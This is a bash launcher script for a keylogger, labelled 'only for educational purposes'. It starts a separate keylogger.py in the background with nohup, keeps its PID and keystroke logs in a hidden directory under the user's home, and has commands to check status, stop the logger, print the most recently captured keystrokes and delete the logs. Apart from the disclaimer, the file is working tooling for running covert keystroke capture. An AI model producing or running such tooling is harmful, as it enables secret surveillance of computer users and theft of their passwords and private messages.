#!/bin/bash

# Educational Keylogger Launcher
# ONLY FOR EDUCATIONAL PURPOSES

KEYLOGGER_SCRIPT="keylogger.py"
LOG_DIR="$HOME/.keylogger_logs"
PID_FILE="$LOG_DIR/keylogger.pid"
LOG_FILE="keystrokes_$(date +%Y%m%d_%H%M%S).log"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

print_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if Python is available
check_python() {
    if ! command -v python3 &> /dev/null; then
        print_error "Python3 is not installed or not in PATH"
        exit 1
    fi
    print_info "Python3 found: $(python3 --version)"
}

# Create necessary directories
setup_directories() {
    mkdir -p "$LOG_DIR"
    print_info "Log directory created: $LOG_DIR"
}

# Start keylogger in background
start_keylogger() {
    if [ -f "$PID_FILE" ] && ps -p $(cat "$PID_FILE") > /dev/null 2>&1; then
        print_warning "Keylogger is already running (PID: $(cat "$PID_FILE"))"
        exit 1
    fi
    
    print_info "Starting keylogger in background..."
    print_info "Log file: $LOG_DIR/$LOG_FILE"
    
    # Run keylogger in background
    nohup python3 "$KEYLOGGER_SCRIPT" --background "$LOG_FILE" > "$LOG_DIR/keylogger_output.log" 2>&1 &
    
    KEYLOGGER_PID=$!
    echo $KEYLOGGER_PID > "$PID_FILE"
    
    print_info "Keylogger started with PID: $KEYLOGGER_PID"
    print_info "Output redirected to: $LOG_DIR/keylogger_output.log"
    
    sleep 2
    
    # Verify it's running
    if ps -p $KEYLOGGER_PID > /dev/null; then
        print_info "Keylogger is running successfully"
        print_info "To stop: ./stop_keylogger.sh or kill $KEYLOGGER_PID"
    else
        print_error "Failed to start keylogger. Check $LOG_DIR/keylogger_output.log for details."
        exit 1
    fi
}

# Show usage information
show_usage() {
    echo "Educational Keylogger Management"
    echo ""
    echo "Usage: $0 [command]"
    echo ""
    echo "Commands:"
    echo "  start     - Start the keylogger in background"
    echo "  status    - Check if keylogger is running"
    echo "  stop      - Stop the keylogger"
    echo "  logs      - Show recent logs"
    echo "  clean     - Remove all log files and stop keylogger"
    echo ""
    echo "Examples:"
    echo "  $0 start          # Start keylogger"
    echo "  $0 status         # Check status"
    echo "  $0 stop           # Stop keylogger"
    echo "  ps aux | grep keylogger.py  # Find keylogger process"
}

# Check keylogger status
check_status() {
    if [ -f "$PID_FILE" ]; then
        PID=$(cat "$PID_FILE")
        if ps -p $PID > /dev/null 2>&1; then
            print_info "Keylogger is running (PID: $PID)"
            echo "Process info:"
            ps -p $PID -o pid,user,etime,command
            return 0
        else
            print_warning "PID file exists but process is not running"
            rm -f "$PID_FILE"
            return 1
        fi
    else
        print_info "Keylogger is not running (no PID file)"
        return 1
    fi
}

# Stop keylogger
stop_keylogger() {
    if [ -f "$PID_FILE" ]; then
        PID=$(cat "$PID_FILE")
        if ps -p $PID > /dev/null 2>&1; then
            print_info "Stopping keylogger (PID: $PID)"
            kill $PID
            sleep 1
            if ps -p $PID > /dev/null 2>&1; then
                print_warning "Process didn't terminate gracefully, forcing..."
                kill -9 $PID
            fi
            print_info "Keylogger stopped"
        else
            print_warning "Keylogger process not found"
        fi
        rm -f "$PID_FILE"
    else
        print_warning "No PID file found. Trying to find and kill process..."
        pkill -f "keylogger.py" && print_info "Keylogger processes terminated" || print_info "No keylogger processes found"
    fi
}

# Show logs
show_logs() {
    if [ -f "$LOG_DIR/$LOG_FILE" ]; then
        print_info "Recent keystrokes:"
        tail -20 "$LOG_DIR/$LOG_FILE"
    else
        LATEST_LOG=$(ls -t "$LOG_DIR"/keystrokes_*.log 2>/dev/null | head -1)
        if [ -n "$LATEST_LOG" ]; then
            print_info "Recent keystrokes from $LATEST_LOG:"
            tail -20 "$LATEST_LOG"
        else
            print_info "No log files found"
        fi
    fi
}

# Clean up everything
clean_up() {
    print_warning "This will remove ALL log files and stop the keylogger!"
    read -p "Are you sure? (y/N): " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        stop_keylogger
        rm -rf "$LOG_DIR"
        print_info "All logs and temporary files removed"
    else
        print_info "Cleanup cancelled"
    fi
}

# Main execution
case "${1:-}" in
    start)
        check_python
        setup_directories
        start_keylogger
        ;;
    status)
        check_status
        ;;
    stop)
        stop_keylogger
        ;;
    logs)
        show_logs
        ;;
    clean)
        clean_up
        ;;
    *)
        show_usage
        ;;
esac
